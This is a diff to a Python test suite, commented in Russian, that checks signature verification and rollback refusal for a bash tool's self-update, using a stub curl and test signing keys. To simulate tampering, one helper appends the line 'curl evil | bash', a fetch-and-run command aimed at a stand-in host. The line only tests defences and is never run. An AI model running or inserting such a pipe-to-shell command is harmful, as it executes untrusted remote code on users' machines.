@@ -1284,66 +1284,90 @@ rc, out, _ = bash('echo "$VERSION_SHOW"')
 chk("версия без буквы у обычной сборки", out.strip() == bash('echo "$VERSION"')[1].strip(), out)
 
 print("Подпись обновлений")
-SIG = os.path.join(TMP, "sigsrv")
-SIGBIN = os.path.join(TMP, "sigbin")
-os.makedirs(SIG)
-os.makedirs(SIGBIN)
-# curl, отдающий awg2.sh и awg2.sh.sig «из канала» — файлы из SIG
-with open(os.path.join(SIGBIN, "curl"), "w") as f:
-    f.write(r"""#!/usr/bin/env bash
-out="" url=""
-while (( $# )); do case "$1" in -o) out="$2"; shift 2 ;; http*) url="$1"; shift ;; *) shift ;; esac; done
-url="${url%%\?*}"; src="$SIGSRV/${url##*/}"
-[[ -f "$src" ]] || exit 22
-if [[ -n "$out" ]]; then cp "$src" "$out"; else cat "$src"; fi
-""")
-os.chmod(os.path.join(SIGBIN, "curl"), 0o755)
-subprocess.run(["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-C", "test", "-f", os.path.join(TMP, "relkey")], check=True)
-subprocess.run(["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-C", "evil", "-f", os.path.join(TMP, "evilkey")], check=True)
-PUB = open(os.path.join(TMP, "relkey.pub")).read().split()
-SIGNERS = f'UPDATE_SIGNERS=("{PUB[0]} {PUB[1]}"); '
+# Подпись проверяет ssh-keygen (openssh-client): без него раздел пропускается,
+# а не роняет весь набор
+if not shutil.which("ssh-keygen"):
+    print("  ПРОПУСК: нет ssh-keygen — поставь openssh-client")
+else:
+    SIG = os.path.join(TMP, "sigsrv")
+    SIGBIN = os.path.join(TMP, "sigbin")
+    os.makedirs(SIG)
+    os.makedirs(SIGBIN)
+    # curl, отдающий awg2.sh и awg2.sh.sig «из канала» — файлы из SIG
+    with open(os.path.join(SIGBIN, "curl"), "w") as f:
+        f.write(r"""#!/usr/bin/env bash
+    out="" url=""
+    while (( $# )); do case "$1" in -o) out="$2"; shift 2 ;; http*) url="$1"; shift ;; *) shift ;; esac; done
+    url="${url%%\?*}"; src="$SIGSRV/${url##*/}"
+    [[ -f "$src" ]] || exit 22
+    if [[ -n "$out" ]]; then cp "$src" "$out"; else cat "$src"; fi
+    """)
+    os.chmod(os.path.join(SIGBIN, "curl"), 0o755)
+    subprocess.run(["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-C", "test", "-f", os.path.join(TMP, "relkey")], check=True)
+    subprocess.run(["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-C", "evil", "-f", os.path.join(TMP, "evilkey")], check=True)
+    PUB = open(os.path.join(TMP, "relkey.pub")).read().split()
+    SIGNERS = f'UPDATE_SIGNERS=("{PUB[0]} {PUB[1]}"); '
 
-def build(ver, key="relkey", sign=True, tamper=False):
-    body = "#!/usr/bin/env bash\nset -uo pipefail\n\nVERSION=\"%s\"\n" % ver + "# заполнитель\n" * 6000 + "echo ok\n"
-    path = os.path.join(SIG, "awg2.sh")
-    with open(path, "w") as f:
-        f.write(body)
-    if os.path.exists(path + ".sig"):
-        os.remove(path + ".sig")
-    if sign:
-        subprocess.run(["ssh-keygen", "-q", "-Y", "sign", "-f", os.path.join(TMP, key), "-n", "awg-toolza", path], check=True)
-    if tamper:
-        with open(path, "a") as f:
-            f.write("curl evil | bash\n")
+    def build(ver, key="relkey", sign=True, tamper=False):
+        body = "#!/usr/bin/env bash\nset -uo pipefail\n\nVERSION=\"%s\"\n" % ver + "# заполнитель\n" * 6000 + "echo ok\n"
+        path = os.path.join(SIG, "awg2.sh")
+        with open(path, "w") as f:
+            f.write(body)
+        if os.path.exists(path + ".sig"):
+            os.remove(path + ".sig")
+        if sign:
+            subprocess.run(["ssh-keygen", "-q", "-Y", "sign", "-f", os.path.join(TMP, key), "-n", "awg-toolza", path], check=True)
+        if tamper:
+            with open(path, "a") as f:
+                f.write("curl evil | bash\n")
 
-def fetch(extra="", auto=1):
-    env = dict(ENV, PATH=SIGBIN + ":" + ENV["PATH"], SIGSRV=SIG)
-    r = subprocess.run(["bash", "-c", PRELUDE + SIGNERS + extra + f"AUTO_MODE={auto}; update_channel_init; update_fetch 2>&1"],
-                       input="", capture_output=True, text=True, env=env, timeout=120)
-    return r.returncode, r.stdout
+    def fetch(extra="", auto=1):
+        env = dict(ENV, PATH=SIGBIN + ":" + ENV["PATH"], SIGSRV=SIG)
+        r = subprocess.run(["bash", "-c", PRELUDE + SIGNERS + extra + f"AUTO_MODE={auto}; update_channel_init; update_fetch 2>&1"],
+                           input="", capture_output=True, text=True, env=env, timeout=120)
+        return r.returncode, r.stdout
 
-build("v9.9.9")
-rc, out = fetch()
-chk("подписанная сборка ставится", rc == 0 and "Подпись сборки верна" in out, out[-400:])
-build("v9.9.9", tamper=True)
-rc, out = fetch()
-chk("сборка, изменённая после подписи, отклоняется", rc != 0 and "не сходится" in out, out[-400:])
-build("v9.9.9", key="evilkey")
-rc, out = fetch()
-chk("подпись чужим ключом отклоняется", rc != 0 and "не сходится" in out, out[-400:])
-build("v9.9.9", sign=False)
-rc, out = fetch()
-chk("новая сборка без подписи отклоняется", rc != 0 and "нет подписи" in out, out[-400:])
-build("v1.1.9", sign=False)
-rc, out = fetch()
-chk("старая сборка без подписи — не из бота и API", rc != 0 and "только из меню" in out, out[-400:])
-rc, out = fetch(auto=0)
-chk("старая сборка без подписи — из меню только после yes", rc != 0 and "до подписей" in out, out[-400:])
-build("v9.9.9")
-rc, out = fetch(extra="UPDATE_SIGNERS=(); ")
-chk("тестовая сборка без ключа — ставит с предупреждением", rc == 0 and "без ключа релизов" in out, out[-400:])
-rc, out, _ = bash('grep -c "ssh-ed25519 AAAA" <<< "$(declare -p UPDATE_SIGNERS)"')
-chk("в сборку вшит ключ релизов", out.strip() == "1", out)
+    build("v9.9.9")
+    rc, out = fetch()
+    chk("подписанная сборка ставится", rc == 0 and "Подпись сборки верна" in out, out[-400:])
+    build("v9.9.9", tamper=True)
+    rc, out = fetch()
+    chk("сборка, изменённая после подписи, отклоняется", rc != 0 and "не сходится" in out, out[-400:])
+    build("v9.9.9", key="evilkey")
+    rc, out = fetch()
+    chk("подпись чужим ключом отклоняется", rc != 0 and "не сходится" in out, out[-400:])
+    build("v9.9.9", sign=False)
+    rc, out = fetch()
+    chk("новая сборка без подписи отклоняется", rc != 0 and "нет подписи" in out, out[-400:])
+    build("v1.1.9", sign=False)
+    rc, out = fetch()
+    chk("старая сборка без подписи — не из бота и API", rc != 0 and "только из меню" in out, out[-400:])
+    rc, out = fetch(auto=0)
+    chk("старая сборка без подписи — из меню только после yes", rc != 0 and "до подписей" in out, out[-400:])
+    build("v9.9.9")
+    rc, out = fetch(extra="UPDATE_SIGNERS=(); ")
+    chk("тестовая сборка без ключа — ставит с предупреждением", rc == 0 and "без ключа релизов" in out, out[-400:])
+    rc, out, _ = bash('grep -c "ssh-ed25519 AAAA" <<< "$(declare -p UPDATE_SIGNERS)"')
+    chk("в сборку вшит ключ релизов", out.strip() == "1", out)
+
+# Откат из бота и панели не ставится и с force: подпись не привязана к версии
+OLDF = os.path.join(TMP, "old-awg2.sh")
+with open(OLDF, "w") as f:
+    f.write('#!/usr/bin/env bash\nVERSION="v1.0.0"\n')
+TGT = os.path.join(TMP, "tgt-awg2")
+with open(TGT, "w") as f:
+    f.write("current\n")
+def rollback(api_mode, force):
+    rc, out, err = bash(f'SCRIPT_PATH="{TGT}"; VERSION=v1.2.2; UPDATE_NEW=v1.0.0; UPDATE_FILE="{OLDF}"; '
+                        f'API_MODE={api_mode}; update_install {force} 2>&1; echo "rc=$?"')
+    return out
+out = rollback(1, "force")
+chk("откат из API с force — отказ, файл не тронут", "rc=1" in out and "только из меню" in out
+    and open(TGT).read() == "current\n", out)
+out = rollback(0, "")
+chk("откат из меню без force — отказ", "rc=1" in out and open(TGT).read() == "current\n", out)
+out = rollback(0, "force")
+chk("откат из меню с force (после yes) — ставится", "rc=0" in out and "v1.0.0" in open(TGT).read(), out)
 
 print("\n── Запуск из распакованного архива ──")
 INST = os.path.join(TMP, "inst")
